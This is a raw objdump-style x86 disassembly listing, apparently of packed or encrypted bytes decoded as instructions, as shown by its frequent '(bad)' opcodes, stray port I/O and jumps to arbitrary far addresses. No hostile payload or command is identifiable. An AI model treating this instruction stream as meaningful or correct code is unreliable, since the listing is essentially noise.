  4038dd:	mov    bh,0xe7
  4038df:	stc    
  4038e0:	pusha  
  4038e1:	xor    BYTE PTR [eax-0x305056c4],dl
  4038e7:	or     DWORD PTR [ebx],ebx
  4038e9:	ror    DWORD PTR [eax-0x406e6ad5],0xe3
  4038f0:	xor    DWORD PTR [eax],ebx
  4038f2:	mov    BYTE PTR [eax],ch
  4038f4:	adc    ecx,DWORD PTR [eax-0x3f9250a4]
  4038fa:	adc    eax,0x4d7e5373
  4038ff:	retf   
  403900:	test   edx,ecx
  403902:	sbb    eax,0x4431bcf
  403907:	mov    eax,ds:0x5e79cffa
  40390c:	or     DWORD PTR [ecx],ecx
  40390e:	dec    ebp
  40390f:	call   0x42f9e999
  403914:	jge    0x4038be
  403916:	repz in al,0x22
  403919:	pushf  
  40391a:	test   al,0x28
  40391c:	mov    DWORD PTR [ecx+0x20825b03],0xa2cbd691
  403926:	mov    cl,0x68
  403928:	or     BYTE PTR cs:[ebp+0x71],dh
  40392c:	cmp    eax,0xa45545f8
  403931:	mov    al,dh
  403933:	loopne 0x403991
  403935:	call   0xf0fde849
  40393a:	sbb    cl,BYTE PTR [edx+esi*2-0x14247b86]
  403941:	pop    edi
  403942:	ins    BYTE PTR es:[edi],dx
  403943:	inc    eax
  403944:	adc    BYTE PTR [esi-0x6e1d8683],ah
  40394a:	and    eax,edi
  40394c:	ret    0x48d8
  40394f:	and    BYTE PTR [eax],bh
  403951:	add    al,0xf6
  403953:	jb     0x4038f1
  403955:	sub    al,0x50
  403957:	rcpps  xmm3,XMMWORD PTR [eax-0x3f1b40b6]
  40395e:	fs xchg ecx,eax
  403960:	dec    esp
  403961:	es push cs
  403963:	add    dl,BYTE PTR [ebp+0x7c]
  403966:	scas   eax,DWORD PTR es:[edi]
  403967:	enter  0x17d2,0x5e
  40396b:	ret    0xdded
  40396e:	and    al,BYTE PTR [esi]
  403970:	neg    BYTE PTR [esi]
  403972:	add    BYTE PTR [ebp-0x2f],bl
  403975:	xor    DWORD PTR [edx-0x65],0x2a
  403979:	sbb    esi,DWORD PTR [edi-0x63a2bdee]
  40397f:	inc    ebx
  403980:	ins    DWORD PTR es:[edi],dx
  403981:	(bad)  
  403982:	fcom   DWORD PTR [esi+0x35]
  403985:	xchg   esi,eax
  403986:	in     eax,0xa8
  403988:	ja     0x40395d
  40398a:	ins    BYTE PTR es:[edi],dx
  40398b:	pop    ebp
  40398c:	inc    edx
  40398d:	add    DWORD PTR [ecx+0x9],esi
  403990:	dec    esp
  403991:	or     al,0xab
  403993:	mov    esi,0x356649e
  403998:	sub    bl,BYTE PTR [ecx]
  40399a:	push   ds
  40399b:	pop    edx
  40399c:	cdq    
  40399d:	adc    eax,0x1910412b
  4039a2:	cmp    DWORD PTR [edx-0xa],0x8
  4039a6:	nop
  4039a7:	cmp    DWORD PTR [edx+0x56],ebp
  4039aa:	pop    ebx
  4039ab:	mov    ebx,0x7215d203
  4039b0:	mul    ecx
  4039b2:	popf   
  4039b3:	call   FWORD PTR [esi]
  4039b5:	adc    ebp,DWORD PTR [ebx+0x6d9df7e1]
  4039bb:	sbb    BYTE PTR [esi+0x41d712eb],bh
  4039c1:	sub    edx,edi
  4039c3:	jo     0x403a08
  4039c5:	mov    eax,0x1bdc6671
  4039ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039cb:	xor    DWORD PTR [edi-0x4e],ebp
  4039ce:	push   esp
  4039cf:	aas    
  4039d0:	stos   BYTE PTR es:[edi],al
  4039d1:	cbw    
  4039d3:	jnp    0x4039c1
  4039d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d6:	push   esp
  4039d7:	pop    esi
  4039d8:	retf   0x9e5d
  4039db:	punpckldq mm6,DWORD PTR [edx]
  4039de:	pop    ebx
  4039df:	push   esp
  4039e0:	leave  
  4039e1:	stos   DWORD PTR es:[edi],eax
  4039e2:	mov    esi,0x4d4fa863
  4039e7:	mov    cl,0xdf
  4039e9:	rol    ah,cl
  4039eb:	ins    BYTE PTR es:[edi],dx
  4039ec:	popf   
  4039ed:	and    eax,0x96f063cf
  4039f2:	xchg   ebx,eax
  4039f3:	in     al,dx
  4039f4:	pop    ecx
  4039f5:	push   es
  4039f6:	push   edi
  4039f7:	out    0x4d,al
  4039f9:	(bad)  
  4039fa:	pop    esi
  4039fb:	push   edx
  4039fc:	cs iret 
  4039fe:	retf   0x4adf
  403a01:	aam    0xcd
  403a03:	or     al,0x3e
  403a05:	in     eax,0x10
  403a07:	inc    eax
  403a08:	jle    0x403a6c
  403a0a:	pop    edx
  403a0b:	dec    ebp
  403a0c:	addr16 into 
  403a0e:	push   ecx
  403a0f:	(bad)  
  403a10:	in     eax,dx
  403a11:	nop
  403a12:	mov    DWORD PTR [esi+0x37b8fae7],ecx
  403a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a19:	pop    ss
  403a1a:	jae    0x403a5b
  403a1c:	aad    0xf1
  403a1e:	pop    es
  403a1f:	and    DWORD PTR [ecx+edi*2],ebp
  403a22:	retf   
  403a23:	inc    ecx
  403a24:	fcomp  DWORD PTR [edi]
  403a26:	mov    eax,0x85b98591
  403a2b:	sbb    ah,BYTE PTR [esi-0x528c1639]
  403a31:	adc    BYTE PTR [esp+edx*4-0x74a77df7],bl
  403a38:	mov    ch,0x7a
  403a3a:	dec    edi
  403a3b:	cmp    bl,BYTE PTR [eax-0xe23743a]
  403a41:	dec    edi
  403a42:	and    BYTE PTR [eax],dh
  403a44:	and    ah,BYTE PTR [edx]
  403a46:	mov    ?,WORD PTR [edi-0x848d72d]
  403a4c:	jmp    0x38c2889d
  403a51:	(bad)  
  403a52:	cli    
  403a53:	xchg   esp,eax
  403a54:	xor    al,0x13
  403a56:	pop    ebp
  403a57:	sbb    DWORD PTR [esi-0x6c25237c],eax
  403a5d:	sub    al,0xdb
  403a5f:	test   DWORD PTR [edi],edi
  403a61:	xor    eax,0xe3141869
  403a66:	push   eax
  403a67:	pop    esi
  403a68:	retf   
  403a69:	ins    BYTE PTR es:[edi],dx
  403a6a:	or     al,0x59
  403a6c:	mov    ah,0xcc
  403a6e:	adc    DWORD PTR [ecx+0x6f4616cf],edx
  403a74:	js     0x403ae4
  403a76:	ss out dx,eax
  403a78:	push   0xffffffa5
  403a7a:	clc    
  403a7b:	jnp    0x403abf
  403a7d:	add    BYTE PTR [esi],ah
  403a7f:	xchg   esi,eax
  403a80:	sub    al,0x62
  403a82:	repnz pop ebp
  403a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a85:	cmp    al,0x10
  403a87:	mov    edi,0x4bf6963a
  403a8c:	sub    BYTE PTR [edi+0x43c7734e],dl
  403a92:	adc    dl,dh
  403a94:	sub    bh,cl
  403a96:	shl    ecx,0x88
  403a99:	fild   DWORD PTR [edi+0x54c978a6]
  403a9f:	into   
  403aa0:	mov    WORD PTR [ecx+edx*1+0x280c8418],ss
  403aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aa8:	pop    ebx
  403aa9:	idiv   BYTE PTR [ecx+0x6142e4fb]
  403aaf:	jecxz  0x403a68
  403ab1:	jle    0x403b30
  403ab3:	aas    
  403ab4:	push   esp
  403ab5:	jne    0x403aa0
  403ab7:	les    edi,FWORD PTR [ecx+0x4a]
  403aba:	sbb    BYTE PTR [edi],ch
  403abc:	sub    ah,bl
  403abe:	loop   0x403a8b
  403ac0:	push   cs
  403ac1:	popa   
  403ac2:	mov    dl,0x78
  403ac4:	dec    ebx
  403ac5:	out    dx,eax
  403ac6:	jo     0x403aae
  403ac8:	gs jne 0x403a76
  403acb:	add    DWORD PTR [esi],ebp
  403acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ace:	sub    ebp,edi
  403ad0:	call   0x37ba4728
  403ad5:	adc    cl,BYTE PTR [ebx]
  403ad7:	jmp    0x403ace
  403ad9:	ror    BYTE PTR [edx+esi*1+0xacaaedc],cl
  403ae0:	iret   
  403ae1:	dec    eax
  403ae2:	scas   eax,DWORD PTR es:[edi]
  403ae3:	in     eax,dx
  403ae4:	inc    ebx
  403ae5:	sub    eax,0x9d309c2b
  403aea:	in     eax,0xc1
  403aec:	aam    0x6a
  403aee:	jnp    0x403aa4
  403af0:	mov    bh,ch
  403af2:	xor    al,0x76
  403af4:	mov    ds:0xe3135b23,al
  403af9:	in     al,0x63
  403afb:	xor    BYTE PTR [ebp+0x7eacaa32],dh
  403b01:	xchg   esp,eax
  403b02:	adc    edx,DWORD PTR [edi+0x1abd29b3]
  403b08:	cmp    al,0xa4
  403b0a:	rcr    cl,1
  403b0c:	enter  0x89bb,0xec
  403b10:	pop    esp
  403b11:	inc    ecx
  403b12:	rcl    DWORD PTR [edi-0x3484a9f3],cl
  403b18:	pop    edx
  403b19:	push   ecx
  403b1a:	dec    esi
  403b1b:	pop    esi
  403b1c:	es xchg ebx,eax
  403b1e:	fsubr  DWORD PTR [ecx-0x7d]
  403b21:	std    
  403b22:	inc    edi
  403b23:	retf   
  403b24:	xor    eax,0x7f4ec78b
  403b29:	mov    ah,0x36
  403b2b:	int    0xee
  403b2d:	iret   
  403b2e:	loope  0x403b36
  403b30:	xlat   BYTE PTR ds:[ebx]
  403b31:	scas   eax,DWORD PTR es:[edi]
  403b32:	nop
  403b33:	sar    BYTE PTR [ebp-0x7d],0x67
  403b37:	in     eax,dx
  403b38:	adc    al,0xcb
  403b3a:	inc    ecx
  403b3b:	sbb    al,0xfc
  403b3d:	js     0x403b49
  403b3f:	lahf   
  403b40:	mov    cl,0x57
  403b42:	xlat   BYTE PTR ds:[ebx]
  403b43:	inc    esi
  403b44:	dec    ebx
  403b45:	pop    eax
  403b46:	stos   BYTE PTR es:[edi],al
  403b47:	jg     0x403baf
  403b49:	pop    ebp
  403b4a:	fsubr  QWORD PTR [ebx+0x36]
  403b4d:	hlt    
  403b4e:	pop    esi
  403b4f:	adc    eax,0xeaf5611d
  403b54:	mov    eax,0xeeccd8b7
  403b59:	push   ecx
  403b5a:	pop    edx
  403b5b:	mov    esi,0xd62df716
  403b60:	pop    eax
  403b61:	ds jl  0x403b72
  403b64:	cmp    edi,DWORD PTR cs:[esi-0x76]
  403b68:	repz out dx,eax
  403b6a:	sub    cl,BYTE PTR [ebx-0x3e]
  403b6d:	xor    cl,BYTE PTR [edx-0x29]
  403b70:	adc    ch,BYTE PTR [edx+0x5b3e47c0]
  403b76:	and    eax,0x9f2c3c81
  403b7b:	jno    0x403bfb
  403b7d:	jmp    0xeaf3:0x8fd0ca1c
  403b84:	xor    ebp,edi
  403b86:	pop    esp
  403b87:	loopne 0x403bb4
  403b89:	lea    ecx,[ebx-0x2ba7740b]
  403b8f:	inc    edx
  403b90:	stos   DWORD PTR es:[edi],eax
  403b91:	popa   
  403b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b93:	daa    
  403b94:	fwait
  403b95:	cmp    al,0x45
  403b97:	jb     0x403c0f
  403b99:	fdiv   st,st(4)
  403b9b:	in     eax,0xda
  403b9d:	push   edx
  403b9e:	cmp    al,0xd0
  403ba0:	inc    esi
  403ba1:	sub    BYTE PTR [eax+ebx*1-0x65d90bc8],al
  403ba8:	call   0x5148:0x3146e628
  403baf:	fisttp WORD PTR [esi-0x134e9310]
  403bb5:	adc    al,bh
  403bb7:	ficomp WORD PTR [eax]
  403bb9:	repnz mov DWORD PTR [ebx],esi
  403bbc:	push   eax
  403bbd:	popa   
  403bbe:	aad    0x97
  403bc0:	or     eax,0x9672e9ae
  403bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc6:	adc    cl,dl
  403bc8:	fwait
  403bc9:	add    edx,edi
  403bcb:	mov    WORD PTR [ebx-0x5f],?
  403bce:	sbb    eax,0xea15b1c6
  403bd3:	popf   
  403bd4:	jnp    0x403ba1
  403bd6:	xor    dl,BYTE PTR [edi-0x24]
  403bd9:	inc    ebp
  403bda:	ss icebp 
  403bdc:	out    0x6a,eax
  403bde:	aam    0xce
  403be0:	scas   eax,DWORD PTR es:[edi]
  403be1:	cmp    edi,0x9bafe63c
  403be7:	jle    0x403b88
  403be9:	inc    ecx
  403bea:	in     al,0x43
  403bec:	enter  0x81c2,0xcf
  403bf0:	and    BYTE PTR [ecx],0xa2
  403bf3:	popa   
  403bf4:	jl     0x403beb
  403bf6:	mov    WORD PTR [esi-0x6f],?
  403bf9:	mov    cl,0x9
  403bfb:	pop    ss
  403bfc:	pusha  
  403bfd:	loope  0x403c79
  403bff:	push   es
  403c00:	or     al,0xfd
  403c02:	dec    ebp
  403c03:	mov    bl,0xf6
  403c05:	nop
  403c06:	cmp    cl,dh
  403c08:	jp     0x403c13
  403c0a:	outs   dx,BYTE PTR ss:[esi]
  403c0c:	ret    
  403c0d:	adc    eax,0xd5d2ff6f
  403c12:	aad    0x7f
  403c14:	ret    0xfef8
  403c17:	in     al,0x4b
  403c19:	daa    
  403c1a:	xchg   BYTE PTR [esi+0x1],ch
  403c1d:	push   ds
  403c1e:	loop   0x403c9a
  403c20:	mov    dh,0xeb
  403c22:	xchg   ebp,eax
  403c23:	leave  
  403c24:	jno    0x403c22
  403c26:	mov    ss,WORD PTR [edi-0x32]
  403c29:	out    0x4f,eax
  403c2b:	and    ebp,DWORD PTR [ebp+0x6b]
  403c2e:	push   cs
  403c2f:	xchg   ebp,eax
  403c30:	(bad)  
  403c31:	jp     0x403c47
  403c33:	scas   al,BYTE PTR es:[edi]
  403c34:	sti    
  403c35:	pushf  
  403c36:	fs jecxz 0x403bd6
  403c39:	rcr    DWORD PTR [esi+0x32cc958b],1
  403c3f:	sub    DWORD PTR [ecx],ecx
  403c41:	mov    dh,0x19
  403c43:	and    eax,0xf261d8b8
  403c48:	fs push esi
  403c4a:	pop    ebx
  403c4b:	cmp    bl,ch
  403c4d:	pop    edx
  403c4e:	pushf  
  403c4f:	jg     0x403c55
  403c51:	and    ch,BYTE PTR [ebp-0x342ee036]
  403c57:	sahf   
  403c58:	fwait
  403c59:	dec    esi
  403c5a:	fwait
  403c5b:	lds    edx,FWORD PTR [ecx+0x1eb37c33]
  403c61:	in     al,0x16
  403c63:	jge    0x403c11
  403c65:	icebp  
  403c66:	repnz mov eax,ds:0xd0319fb5
  403c6c:	mov    ebp,0x7f185796
  403c71:	cwde   
  403c72:	adc    al,0xb7
  403c74:	pop    edx
  403c75:	sub    DWORD PTR [ecx+0x1a],0xfffffffe
  403c79:	cli    
  403c7a:	mov    ds:0x1d5a668d,al
  403c7f:	std    
  403c80:	mov    cl,0x4c
  403c82:	mov    ds:0xa6f4ebdc,eax
  403c87:	(bad)
  403c8c:	(bad)  
  403c8d:	push   eax
  403c8e:	arpl   WORD PTR [esi-0x4d9aaa60],sp
  403c94:	add    DWORD PTR [edx+0x420201b4],esp
  403c9a:	dec    ebx
  403c9b:	sub    bh,BYTE PTR [edi-0x22946728]
  403ca1:	or     esi,ebp
  403ca3:	shr    DWORD PTR [edx-0x10],1
  403ca6:	mov    esi,0x7e7abebc
  403cab:	out    0x3,al
  403cad:	push   edx
  403cae:	mov    dh,0x61
  403cb0:	mov    esp,DWORD PTR [ecx]
  403cb2:	psubsw mm5,mm4
  403cb5:	rcr    BYTE PTR [edi+0x33],0x8e
  403cb9:	jg     0x403cf8
  403cbb:	pop    ecx
  403cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cbd:	(bad)  
  403cbe:	and    edi,DWORD PTR [esi]
  403cc0:	push   ss
  403cc1:	test   BYTE PTR [ebp+0x6a2bb2f],bl
  403cc7:	fimul  DWORD PTR ds:0xbb9ab3e8
  403ccd:	sti    
  403cce:	daa    
  403ccf:	icebp  
  403cd0:	cmp    al,0xb4
  403cd2:	lods   eax,DWORD PTR ds:[esi]
  403cd3:	ret    
  403cd4:	test   DWORD PTR [eax],edx
  403cd6:	and    eax,DWORD PTR [esi-0x5d5266cd]
  403cdc:	jns    0x403d18
  403cde:	ret    0xc65f
  403ce1:	and    cl,0xde
  403ce4:	sub    bl,BYTE PTR [esi]
  403ce6:	std    
  403ce7:	xchg   edx,eax
  403ce8:	or     BYTE PTR [ebp+0x3f5e09d7],ch
  403cee:	call   FWORD PTR [ecx]
  403cf0:	or     BYTE PTR [edx+ebx*4-0x5dbd6a9c],bl
  403cf7:	mov    dh,0xe4
  403cf9:	pop    ss
  403cfa:	dec    edi
  403cfb:	std    
  403cfc:	and    DWORD PTR [ebx+0x44],edi
  403cff:	dec    ebx
  403d00:	or     al,BYTE PTR [esi-0xb1c1a12]
  403d06:	sub    eax,0xead7a6fa
  403d0b:	stos   DWORD PTR es:[edi],eax
  403d0c:	(bad)  
  403d0d:	in     eax,dx
  403d0e:	lods   eax,DWORD PTR ds:[esi]
  403d0f:	popf   
  403d10:	cmp    DWORD PTR [edx+eax*1],0x4d
  403d14:	xchg   esp,eax
  403d15:	add    DWORD PTR [esp+eiz*4+0x6e2269c3],esp
  403d1c:	mov    ds:0x566c420e,al
  403d21:	mov    ebp,0x4c1138c2
  403d26:	pop    esi
  403d27:	(bad)  
  403d28:	daa    
  403d29:	fstp   st(4)
  403d2b:	xchg   ecx,eax
  403d2c:	mov    bh,0xf1
  403d2e:	cmp    eax,0xff0fd
  403d33:	scas   al,BYTE PTR es:[edi]
  403d34:	xor    DWORD PTR [edi+edx*8+0x78],edx
  403d38:	jge    0x403cf9
  403d3a:	push   es
  403d3b:	clc    
  403d3c:	or     al,0x26
  403d3e:	retf   
  403d3f:	rcr    DWORD PTR [ebp-0x6f],1
  403d42:	and    edx,ebp
  403d44:	stos   DWORD PTR es:[edi],eax
  403d45:	(bad)  [edx-0x5d747f43]
  403d4b:	pop    ebp
  403d4c:	int3   
  403d4d:	imul   ebp,edx,0x297777c2
  403d53:	add    al,0x2e
  403d55:	cmp    DWORD PTR [ebp-0x40],edx
  403d58:	mov    esp,ds
  403d5a:	mov    ch,BYTE PTR [ecx-0x6f]
  403d5d:	add    dh,bh
  403d5f:	xor    BYTE PTR [esi],dl
  403d61:	out    0xa0,al
  403d63:	inc    esp
  403d64:	adc    DWORD PTR [edx],esp
  403d66:	push   ebp
  403d67:	pusha  
  403d68:	mov    ebx,0x3eeef8be
  403d6d:	lods   al,BYTE PTR ds:[esi]
  403d6e:	cs cs push esp
  403d71:	and    eax,0xc9ae9b1
  403d76:	dec    esi
  403d77:	xchg   esp,eax
  403d78:	loope  0x403d91
  403d7a:	jecxz  0x403de9
  403d7c:	cmp    cl,BYTE PTR [edi+0x596ef786]
  403d82:	es scas eax,DWORD PTR es:[edi]
  403d84:	mov    bh,0xea
  403d86:	(bad)  
  403d88:	xor    esp,edx
  403d8a:	daa    
  403d8b:	xor    DWORD PTR [eax+0x7d874f81],edx
  403d91:	mov    ebp,0x35ce269e
  403d96:	out    dx,al
  403d97:	mov    esi,edi
  403d99:	imul   esi,edi,0x1d
  403d9c:	cmp    DWORD PTR [edi],esp
  403d9e:	pop    esp
  403d9f:	icebp  
  403da0:	lea    esi,[edi+0x3f7becf1]
  403da6:	mov    al,bl
  403da8:	sahf   
  403da9:	add    edx,DWORD PTR [ecx-0x2078c56]
  403daf:	pop    ebx
  403db0:	outs   dx,DWORD PTR ds:[esi]
  403db1:	out    0x3,eax
  403db3:	lods   eax,DWORD PTR ds:[esi]
  403db4:	sub    ah,BYTE PTR [ecx]
  403db6:	sbb    al,0xe6
  403db8:	cmp    ch,0x18
  403dbb:	and    ch,bh
  403dbd:	fadd   DWORD PTR [edx]
  403dbf:	rcr    DWORD PTR [edi-0x8531433],1
  403dc5:	xchg   esi,eax
  403dc6:	dec    esp
  403dc7:	adc    ch,bh
  403dc9:	mov    cl,BYTE PTR [esi-0x4c1de0b4]
  403dcf:	icebp  
  403dd0:	xchg   bl,dl
  403dd2:	adc    edx,DWORD PTR [ecx-0x7411be40]
  403dd8:	mov    esp,0x2615a37b
  403ddd:	aad    0x7
  403ddf:	in     al,dx
  403de0:	int    0x3d
  403de2:	fsub   DWORD PTR [ecx-0x5562db47]
  403de8:	rcr    dl,cl
  403dea:	and    dl,BYTE PTR [ecx+esi*2+0x15155675]
  403df1:	shr    DWORD PTR [eax],1
  403df3:	out    dx,al
  403df4:	mov    al,0xb
  403df6:	push   esi
  403df7:	xchg   ecx,eax
  403df8:	pop    edx
  403df9:	sbb    bh,BYTE PTR [esi-0x504e7da2]
  403dff:	xchg   edi,eax
  403e00:	push   ss
  403e01:	pop    es
  403e02:	mov    eax,ds:0x15086ee3
  403e07:	fwait
  403e08:	sub    BYTE PTR [ebx-0x58],0xa4
  403e0c:	lods   eax,DWORD PTR ds:[esi]
  403e0d:	jmp    0x5270:0x4265b8b2
  403e14:	add    bh,bl
  403e16:	add    ah,bl
  403e18:	ins    BYTE PTR es:[edi],dx
  403e19:	dec    ecx
  403e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e1b:	add    ebx,DWORD PTR [esi+0xb]
  403e1e:	out    dx,al
  403e1f:	adc    eax,0x4ab0e909
  403e24:	dec    eax
  403e25:	test   ebx,eax
  403e27:	ret    0x69b2
  403e2a:	jo     0x403dfe
  403e2c:	and    al,0x3e
  403e2e:	xchg   edi,eax
  403e2f:	std    
  403e30:	shr    BYTE PTR [ebx],0x3a
  403e33:	xchg   esp,eax
  403e34:	sbb    bl,0x40
  403e37:	test   al,0xbb
  403e39:	mov    eax,0x4a2fd2aa
  403e3e:	ds dec esp
  403e40:	js     0x403e9c
  403e42:	dec    esi
  403e43:	imul   edx,DWORD PTR [esi+0x195e3b02],0x17
  403e4a:	(bad)  
  403e4b:	sti    
  403e4c:	adc    al,0x2c
  403e4e:	ins    BYTE PTR es:[edi],dx
  403e4f:	dec    ebp
  403e50:	int    0xf6
  403e52:	fs and eax,0xfc5fd134
  403e58:	xor    ebp,DWORD PTR [ebp-0x3fc97868]
  403e5e:	dec    edi
  403e5f:	std    
  403e60:	je     0x403ea6
  403e62:	mov    esi,0x12d0e14f
  403e67:	jmp    0x1848db05
  403e6c:	fld    QWORD PTR [ebx+0x1]
  403e6f:	mov    BYTE PTR [esi],dl
  403e71:	jns    0x403e20
  403e73:	call   0x4a86:0x518b733f
  403e7a:	fsubr  st(5),st
  403e7c:	dec    eax
  403e7d:	(bad)  [edi+0x71]
  403e80:	xchg   edi,eax
  403e81:	pushf  
  403e82:	push   ebp
  403e83:	adc    cl,0xd4
  403e86:	in     al,dx
  403e87:	std    
  403e88:	xor    DWORD PTR [ebp+0x5a75c5b4],ecx
  403e8e:	aas    
  403e8f:	leave  
  403e90:	scas   eax,DWORD PTR es:[edi]
  403e91:	fist   WORD PTR [edx]
  403e93:	mov    ds:0xecd45082,eax
  403e98:	jne    0x403e31
  403e9a:	sbb    eax,0xf3a4c220
  403e9f:	push   edi
  403ea0:	add    eax,DWORD PTR [edx-0x90eeaf8]
  403ea6:	cmp    eax,0xf996add1
  403eab:	xchg   ax,ax
  403ead:	jno    0x403f1f
  403eaf:	mov    al,0xd
  403eb1:	push   ecx
  403eb2:	xchg   esp,eax
  403eb3:	pop    es
  403eb4:	jae    0x403e7e
  403eb6:	in     al,0x5a
  403eb8:	xor    ah,BYTE PTR [eax-0x6c8b4203]
  403ebe:	or     BYTE PTR [ebx-0x47],ah
  403ec1:	sbb    edi,DWORD PTR [edx+ebp*8-0xbe1e4c1]
  403ec8:	sbb    bl,BYTE PTR [ebx+0x63]
  403ecb:	inc    edx
  403ecc:	test   DWORD PTR ds:0x2efeadd4,ebp
  403ed2:	fisubr DWORD PTR [eax-0x50]
  403ed5:	(bad)  
  403ed6:	mov    eax,ds:0xaa094541
  403edb:	fisub  WORD PTR [ecx-0x62]
  403ede:	mov    ds:0x6d671c81,eax
  403ee3:	pop    ecx
  403ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee5:	mul    DWORD PTR ds:0x30a42481
  403eeb:	int    0x5c
  403eed:	sub    BYTE PTR [eax-0x31],0xe4
  403ef1:	cmp    eax,0xa9fd92f9
  403ef6:	lods   eax,DWORD PTR ds:[esi]
  403ef7:	ins    BYTE PTR es:[edi],dx
  403ef8:	div    BYTE PTR [ecx+0x14]
  403efb:	push   cs
  403efc:	xlat   BYTE PTR ds:[ebx]
  403efd:	adc    cl,ah
  403eff:	sub    BYTE PTR [edx-0x492d7cb4],ah
  403f05:	inc    ebp
  403f06:	scas   eax,DWORD PTR es:[edi]
  403f07:	out    0x27,al
  403f09:	nop
  403f0a:	rcr    al,cl
  403f0c:	sub    bh,ah
  403f0e:	repz push eax
  403f10:	inc    esi
  403f11:	adc    BYTE PTR [eax],dh
  403f13:	add    ecx,ecx
  403f15:	dec    edx
  403f16:	repz inc edx
  403f18:	mov    dh,0xff
  403f1a:	cwde   
  403f1b:	loopne 0x403efc
  403f1d:	xor    DWORD PTR [esp+ecx*1+0x3868e6f6],ecx
  403f24:	out    dx,al
  403f25:	out    0xf7,eax
  403f27:	loope  0x403ed7
  403f29:	imul   edx,ebx,0x4a
  403f2c:	cmc    
  403f2d:	jecxz  0x403f8d
  403f2f:	test   bh,0xec
  403f32:	adc    al,0xfc
  403f34:	les    eax,FWORD PTR [ebx+0x305ed9c4]
  403f3a:	mov    al,ds:0x4b3d5673
  403f3f:	cmc    
  403f40:	mov    bh,0x3c
  403f42:	xchg   ebp,eax
  403f43:	mov    ah,0x8a
  403f45:	sbb    bh,ah
  403f47:	or     cl,cl
  403f49:	and    eax,0x50c97e3e
  403f4e:	or     BYTE PTR [edx-0x40],bh
  403f51:	dec    edx
  403f52:	or     eax,0x1dba0b38
  403f57:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403f59:	mov    WORD PTR [ebx],?
  403f5b:	int    0x2d
  403f5d:	cmp    eax,0x4fbbdfea
  403f62:	mov    fs,WORD PTR [ebx+0x2d34712d]
  403f68:	rcr    ch,0xb5
  403f6b:	push   ecx
  403f6c:	ins    BYTE PTR es:[edi],dx
  403f6d:	out    0x62,eax
  403f6f:	push   edi
  403f70:	out    dx,al
  403f71:	les    ecx,FWORD PTR [ecx+0x3a]
  403f74:	xchg   cl,dl
  403f76:	pop    ebx
  403f77:	outs   dx,BYTE PTR ds:[esi]
  403f78:	(bad)
  403f7b:	jecxz  0x403f43
  403f7d:	imul   esp,esi,0x24694773
  403f83:	cmp    esi,DWORD PTR [ebx+0x575c330d]
  403f89:	scas   al,BYTE PTR es:[edi]
  403f8a:	adc    eax,0x3c168fb5
  403f8f:	cmp    DWORD PTR [edx+0x5d],ebx
  403f92:	enter  0x3600,0x2f
  403f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f97:	add    edx,ebp
  403f99:	and    dl,ah
  403f9b:	and    ecx,0x726263
  403fa1:	leave  
  403fa2:	mov    WORD PTR [edx],ds
  403fa4:	nop
  403fa5:	jno    0x403fb9
  403fa7:	xor    DWORD PTR [edi+0x6d],esp
  403faa:	iret   
  403fab:	or     BYTE PTR [eax-0x4555d6be],dh
  403fb1:	sbb    esp,DWORD PTR [edi-0x57]
  403fb4:	nop
  403fb5:	cs mov eax,0x4a751a4f
  403fbb:	mov    edi,es
  403fbd:	mov    al,ds:0x92f88b68
  403fc2:	sbb    esp,DWORD PTR [ebx+0x471a81c]
  403fc8:	push   esi
  403fc9:	addr16 popf 
  403fcb:	mov    ah,0x8c
  403fcd:	push   edi
  403fce:	xor    esi,eax
  403fd0:	das    
  403fd1:	daa    
  403fd2:	jnp    0x404052
  403fd4:	or     BYTE PTR [edx],ch
  403fd6:	cmp    al,0xf4
  403fd8:	in     al,0x97
  403fda:	loop   0x404010
  403fdc:	ret    
  403fdd:	in     al,dx
  403fde:	test   BYTE PTR [edx+edi*1],ch
  403fe1:	fdiv   QWORD PTR [edi+0x51]
  403fe4:	xor    cl,dl
  403fe6:	push   ss
  403fe7:	(bad)  
  403fe8:	retf   0x5597
  403feb:	and    ch,BYTE PTR [eax+0x5cb09430]
  403ff1:	or     BYTE PTR [ebp+0x1e1fd7ac],al
  403ff7:	in     eax,0x77
  403ff9:	and    BYTE PTR [ebx-0x7623bdc4],0xf
  404000:	call   0x8b959a20
  404005:	add    dh,bl
  404007:	ret    0xc171
  40400a:	add    bh,BYTE PTR [ebp-0x74]
  40400d:	mov    bh,ch
  40400f:	ret    0x2965
  404012:	sub    bl,BYTE PTR [ebx+0x15]
  404015:	xchg   edi,eax
  404016:	jbe    0x403ffe
  404018:	jbe    0x403fb6
  40401a:	mov    BYTE PTR [ecx+0x26],ah
  40401d:	das    
  40401e:	inc    ecx
  40401f:	xchg   ebx,eax
  404020:	mov    BYTE PTR [edi-0x3082175e],0x82
  404027:	out    dx,al
  404028:	jo     0x4040a8
  40402a:	in     eax,dx
  40402b:	cdq    
  40402c:	loope  0x40406d
  40402e:	arpl   WORD PTR [eax-0x6b38c2d8],cx
  404034:	adc    eax,0xac163f22
  404039:	adc    bl,dh
  40403b:	inc    edi
  40403c:	das    
  40403d:	push   esi
  40403e:	push   0xffffff8a
  404040:	out    dx,eax
  404041:	dec    ebp
  404042:	adc    al,0x49
  404044:	dec    eax
  404045:	adc    DWORD PTR [eax+eax*1],edx
  404048:	xor    BYTE PTR [edx],al
  40404a:	cmc    
  40404b:	jo     0x404020
  40404d:	repz sbb DWORD PTR [edx+0x1c98d199],edi
  404054:	fiadd  DWORD PTR [ebx]
  404056:	ficom  WORD PTR [ecx+0x5e]
  404059:	cmp    al,0x37
  40405b:	adc    eax,0x43a6d84a
  404060:	das    
  404061:	fwait
  404062:	lahf   
  404063:	sbb    al,0x4d
  404065:	mov    WORD PTR [esi],ss
  404067:	or     edx,0xf48f2b60
  40406d:	add    DWORD PTR [edi],esp
  40406f:	sbb    al,0xb8
  404071:	fs pop ss
